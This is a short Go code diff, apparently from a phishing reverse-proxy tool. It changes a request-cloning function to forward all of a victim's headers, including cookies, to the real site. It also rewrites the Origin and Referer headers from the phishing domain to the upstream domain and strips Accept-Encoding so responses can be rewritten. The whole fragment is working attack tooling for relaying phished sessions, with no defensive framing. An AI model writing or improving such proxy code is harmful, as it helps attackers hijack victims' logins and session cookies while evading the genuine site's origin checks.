@@ -50,7 +50,13 @@ func cloneRequest(r *http.Request) *http.Request {
 		panic(err)
 	}
 
-	req.Header["Cookie"] = r.Header["Cookie"]
+	req.Header = r.Header
+	origin := strings.Replace(r.Header.Get("Origin"), phishURL, upstreamURL, -1)
+	referer := strings.Replace(r.Header.Get("Referer"), phishURL, upstreamURL, -1)
+
+	req.Header.Del("Accept-Encoding")
+	req.Header.Set("Origin", origin)
+	req.Header.Set("Referer", referer)
 
 	return req
 }
